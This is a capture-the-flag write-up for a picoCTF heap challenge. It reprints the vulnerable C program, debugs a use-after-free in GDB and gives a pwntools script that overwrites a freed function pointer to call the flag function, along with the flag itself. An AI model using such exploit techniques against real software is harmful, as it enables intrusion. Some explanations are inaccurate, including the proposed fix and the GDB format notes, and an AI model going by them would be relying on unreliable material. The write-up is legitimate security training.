# Unsubscriptions Are Free
> Write-up author: vreshco
## DESCRIPTION:
Check out my new video-game and spaghetti-eating streaming channel on Twixer! program and get a flag. source nc mercury.picoctf.net 61817
## HINT:
1. http://homes.sice.indiana.edu/yh33/Teaching/I433-2016/lec13-HeapAttacks.pdf
## STEPS:
1. Given a not stripped 32 bit binary file and the source code.

![image](https://user-images.githubusercontent.com/70703371/224728413-f588d4b1-4a71-42dc-af87-3deb1840cfea.png)


2. Let's check the binary protections.

> VULN -> Partial RELRO, No PIE

![image](https://user-images.githubusercontent.com/70703371/224728578-a298be2a-5490-4d03-b529-3c219e5709f3.png)


3. Actually based from the chall's title we know that the exploit related to **Use After Free** exploit, which is one of the heap attack.
4. Let's analyze the source code given.

> SOURCE CODE

```c
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#define FLAG_BUFFER 200
#define LINE_BUFFER_SIZE 20


typedef struct {
	uintptr_t (*whatToDo)();
	char *username;
} cmd;

char choice;
cmd *user;

void hahaexploitgobrrr(){
 	char buf[FLAG_BUFFER];
 	FILE *f = fopen("flag.txt","r");
 	fgets(buf,FLAG_BUFFER,f);
 	fprintf(stdout,"%s\n",buf);
 	fflush(stdout);
}

char * getsline(void) {
	getchar();
	char * line = malloc(100), * linep = line;
	size_t lenmax = 100, len = lenmax;
	int c;
	if(line == NULL)
		return NULL;
	for(;;) {
		c = fgetc(stdin);
		if(c == EOF)
			break;
		if(--len == 0) {
			len = lenmax;
			char * linen = realloc(linep, lenmax *= 2);

			if(linen == NULL) {
				free(linep);
				return NULL;
			}
			line = linen + (line - linep);
			linep = linen;
		}

		if((*line++ = c) == '\n')
			break;
	}
	*line = '\0';
	return linep;
}

void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}

void s(){
 	printf("OOP! Memory leak...%p\n",hahaexploitgobrrr);
 	puts("Thanks for subsribing! I really recommend becoming a premium member!");
}

void p(){
  	puts("Membership pending... (There's also a super-subscription you can also get for twice the price!)");
}

void m(){
	puts("Account created.");
}

void leaveMessage(){
	puts("I only read premium member messages but you can ");
	puts("try anyways:");
	char* msg = (char*)malloc(8);
	read(0, msg, 8);
}

void i(){
	char response;
  	puts("You're leaving already(Y/N)?");
	scanf(" %c", &response);
	if(toupper(response)=='Y'){
		puts("Bye!");
		free(user);
	}else{
		puts("Ok. Get premium membership please!");
	}
}

void printMenu(){
 	puts("Welcome to my stream! ^W^");
 	puts("==========================");
 	puts("(S)ubscribe to my channel");
 	puts("(I)nquire about account deletion");
 	puts("(M)ake an Twixer account");
 	puts("(P)ay for premium membership");
	puts("(l)eave a message(with or without logging in)");
	puts("(e)xit");
}

void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}

int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}

```

5. Analyzing the main function, it called 3 functions.

```c
int main(){
	setbuf(stdout, NULL);
	user = (cmd *)malloc(sizeof(user));
	while(1){
		printMenu();
		processInput();
		//if(user){
			doProcess(user);
		//}
	}
	return 0;
}

```

6. The `processInput()` function and `doProcess()` function shall be our interest.

> processInput()

```c
void processInput(){
  scanf(" %c", &choice);
  choice = toupper(choice);
  switch(choice){
	case 'S':
	if(user){
 		user->whatToDo = (void*)s;
	}else{
		puts("Not logged in!");
	}
	break;
	case 'P':
	user->whatToDo = (void*)p;
	break;
	case 'I':
 	user->whatToDo = (void*)i;
	break;
	case 'M':
 	user->whatToDo = (void*)m;
	puts("===========================");
	puts("Registration: Welcome to Twixer!");
	puts("Enter your username: ");
	user->username = getsline();
	break;
   case 'L':
	leaveMessage();
	break;
	case 'E':
	exit(0);
	default:
	puts("Invalid option!");
	exit(1);
	  break;
  }
}
```

> doProcess()

```c
void doProcess(cmd* obj) {
	(*obj->whatToDo)();
}
```

7. Anyway let's start by understanding the menus first.

![image](https://user-images.githubusercontent.com/70703371/224735775-6e3aa6de-22c1-4cd5-8ee6-25a4e182e0d1.png)


8. Choosing **S** as our input shall make the program printed out the pointer for `hahaexploitgobrrr()` function.

![image](https://user-images.githubusercontent.com/70703371/224736238-b5421d6f-1add-4e32-abd3-aa3dd8740b99.png)


9. And if we called that `hahaexploitgobrrr()` function it shall printed out the flag stored inside the buf variable.

![image](https://user-images.githubusercontent.com/70703371/224736501-0393453a-43a5-4cfc-b2d8-ccbc55e628fc.png)


10. Next, if we choose **I** as our input, means we want to delete our "user_account" that registered inside.

> NOTES

```
Found the UAF (Use-After-Free) vuln here, the code does not check if the `user` pointer is actually pointing to a valid allocated memory before freeing it. If the `user` pointer was not previously allocated, or if it was already freed beforem the calling `free()` on it will result in undefined behavior, which can cause a crash or other unexpected behavior.

To fix this vuln, the code should first check if `user` is not NULL before calling `free()` on it.
```

![image](https://user-images.githubusercontent.com/70703371/224737655-c9ec7993-b88e-47c6-bf96-f43e00f5515a.png)


11. Then, if we choose **M**, means we want to create an account.

![image](https://user-images.githubusercontent.com/70703371/224907583-347db2be-aac5-4718-a1a1-008a9fee897e.png)


12. And it calls the `getsline()` function which stored the input into the `username` variable.
13. Then if we choose `p` it shall printed out this:

![image](https://user-images.githubusercontent.com/70703371/224908116-09834c37-5b1f-4932-8c3d-674d7bf520f7.png)


14. If `l`, it calls `leaveMessage()` function.

![image](https://user-images.githubusercontent.com/70703371/224908573-07b1d82e-6334-4778-8cc5-261e3b39033e.png)


15. It's printed out a text and it allocates 8 bytes for **msg** var and it stored our input.

![image](https://user-images.githubusercontent.com/70703371/225033872-2598670b-e269-4e60-9475-71dbc4791f0a.png)


16. So until now we know the vuln is at the `i()` function and we can leak the `win()` address by calling the `s()` function.
17. To make it clear, let's decompile the binary to find the correct offset for our breakpoints to see what actually stored inside the pointer variables and does it use the same pointer.
18. Let's see what value stored inside the **EAX** by set a breakpoint for this offset.

> NOTES:

```
What is EAX?
Is a register commonly used to hold function arguments, return values, and other temporary values during program execution.

Why the focus in EAX?
Since there's canary protections which shut us to control the EIP offset via bufferoverflow but EAX may used to pass arguments to the function when calling a function that performs heap operation.
```

![image](https://user-images.githubusercontent.com/70703371/225050103-efc0db94-d673-4e67-9780-9b62105ab886.png)


![image](https://user-images.githubusercontent.com/70703371/225050210-2a07a854-aa87-4b6e-b2a1-d979c221c0cb.png)


19. Next let's set the breakpoint after the `free()`.

![image](https://user-images.githubusercontent.com/70703371/225050973-63fa5e96-ae1a-47aa-a8c0-d49057b29d15.png)


20. The 3rd one is after the malloc for our leave message's input.


![image](https://user-images.githubusercontent.com/70703371/225052203-9fb70669-52b7-4ac6-b2a6-70c5b9600ace.png)


21. After setting up breakpoints at those offsets at GDB, let's run the binary now.

> RESULT -> ESP stored 4 bytes.

![image](https://user-images.githubusercontent.com/70703371/225052940-2e23642e-f498-4824-929b-cf1b5e51d725.png)


22. Now let's display 4 bytes before the address of **EAX** -> `0x804c1a0`.

```
x/8gwx 0x804c1a0 - 4

Notes:
x, specifies that the memory contents should be displayed as hexadecimal values.
/8, specifies that 8 memory locations should be displayed.
g, specifies that the memory contents should be displayed as floating-point values using IEEE standard.
w, specifies that the memory contents should be displayed as 4-byte words (32 bit).
x, specifies that the memory contents should be displayed as hexadecimal values (again).
0x804c1a0, the starting address of the memory to display.
- 4 , an offset of 4 bytes from the starting address.
```

![image](https://user-images.githubusercontent.com/70703371/225057230-61c64134-dbad-453e-ab9a-533870644ffd.png)


23. As we can see it still empty.
24. Now let's input strings by choosing 'M'.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/225059471-bafd2396-95e7-4acd-a0be-643577d2d15b.png)


> Check the **EAX** again by hitting ctrl+c, then check 4 bytes before.

![image](https://user-images.githubusercontent.com/70703371/225060137-d8588192-8c1f-4f64-a152-8470c663c5aa.png)


25. Our input stored in the **EAX**.
26. The 2 on the top is our function pointer and the username variable, the two bottom is our input.

![image](https://user-images.githubusercontent.com/70703371/225060967-5e3bb03c-0a07-4775-aa4b-73096972cf36.png)


27. Our goal is we want the function pointer to pointing to the `win()` function. This time the function pointer is pointing to the `M()` function.

![image](https://user-images.githubusercontent.com/70703371/225063364-190801e0-2f8f-4aa0-af5f-ff542a05f32c.png)


28. Now let's free the user variable by choosing `I()`.

![image](https://user-images.githubusercontent.com/70703371/225064083-3d0cc693-f41a-4a23-abec-ec4442a63771.png)


![image](https://user-images.githubusercontent.com/70703371/225067906-073b1ed3-ab98-4614-bfd0-ea9f87de4b43.png)


29. Hmm.. Kinda confused here the values stored are overwrote and it does not free the memory. Which is weird.. Stuck here for a while, confused figuring out why the flows resulting this, until i tried to continue it and leave a message by choosing `l`.

> RESULT -> The EAX reused the chunk.

![image](https://user-images.githubusercontent.com/70703371/225068656-3d0257a7-0516-4db2-a4e3-6de9deed7774.png)


> Input 8 bytes.

![image](https://user-images.githubusercontent.com/70703371/225068830-401a03dc-3070-4ff1-83e3-bc361bf5e11e.png)


![image](https://user-images.githubusercontent.com/70703371/225068932-9bd2d27b-f545-422a-adbd-d46d9d0c2cfd.png)


30. Got segmentation fault, successfully filled the **RIP**, hence we can send the leaked address as out input for function `L`.
31. To automate the exploit, i use pwntools.

> THE SCRIPT

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe], *a, **kw)

exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

sh.sendlineafter(b'(e)xit', b'S')
sh.recvuntil(b'OOP! Memory leak...')
get = int(sh.recvline(), 16)
info('Leaked win addr: %#0x', get)

p = flat([
    get
])

sh.sendlineafter(b't', b'M')
sh.sendlineafter(b'Enter your username:', b'AAAAAAAA')
sh.sendlineafter(b't', b'I')
sh.sendlineafter(b'?', b'Y')

sh.sendlineafter(b't', b'L')
sh.sendlineafter(b':', p)

sh.interactive()

```

> RUN LOCALLY

![image](https://user-images.githubusercontent.com/70703371/225071743-36cfa798-9de5-45c3-8f57-b05cf169ffcb.png)


![image](https://user-images.githubusercontent.com/70703371/225071819-067cdc34-68bf-4cfd-a14d-ccd2ae9287d5.png)


32. Successfully trigger the `win()` function, let's run it remotely.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/225072042-03e3865b-1963-4b5d-9b22-89952fd95af4.png)


33. Got the flag!

## FLAG

```
picoCTF{d0ubl3_j30p4rdy_1e154727}
```








